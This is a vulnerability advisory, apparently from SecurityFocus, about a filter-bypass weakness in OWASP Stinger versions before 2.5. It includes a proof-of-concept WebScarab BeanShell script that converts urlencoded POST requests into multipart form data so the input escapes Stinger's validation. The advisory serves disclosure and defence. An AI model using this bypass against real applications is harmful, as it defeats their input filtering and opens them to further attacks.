source: http://www.securityfocus.com/bid/25294/info

OWASP Stinger is prone to a filter-bypass weakness because the application fails to properly handle certain input.

Since the OWASP Stinger project is a software module designed to be incorporated into other applications, this weakness may be exploitable only if applications use it in a vulnerable way.

Successfully exploiting this issue may allow attackers to bypass the filter, aiding them in further attacks.

Versions prior to Stinger 2.5 are vulnerable to this issue. 

/*
 * Multipartify.java - Quick and dirty BeanShell for WebScarab to
 * convert urlencoded POST HTTP requests to multipart requests.
 *
 * Copyright (C) 2007 Meder Kydyraliev <meder@o0o.nu>
 *
 * http://o0o.nu/~meder
 *
 */
import org.owasp.webscarab.model.Request;
import org.owasp.webscarab.model.Response;
import org.owasp.webscarab.httpclient.HTTPClient;
import org.owasp.webscarab.model.NamedValue;
import org.owasp.webscarab.model.MultiPartContent;
import java.io.IOException;

public Response fetchResponse(HTTPClient nextPlugin, Request request) throws IOException {

	private static final String contentType = "multipart/form-data; boundary=o0oo0oo0oo0oo0oo0oo0o";
	private static final String boundary= "\r\n--o0oo0oo0oo0oo0oo0oo0o";
	private static final String contentDisp= "\r\nContent-Disposition: form-data; name=";

	if (request.getMethod().equals("POST") && request.getContent() != null) {
		String body = new String(request.getContent());
		StringBuffer newBody = new StringBuffer();
		NamedValue[] postParams = NamedValue.splitNamedValues(body, "&", "=");
		for (int ix=0; ix < postParams.length; ix++) {
			newBody.append(boundary + contentDisp + "\"" + postParams[ix].getName() + "\"\r\n\r\n" + postParams[ix].getValue() + " ");
		}
		newBody.append(boundary + "--\r\n");
		request.setHeader("Content-Type", contentType);
		request.setContent(newBody.substring(2).getBytes());
	}

	response = nextPlugin.fetchResponse(request);

	return response;
}
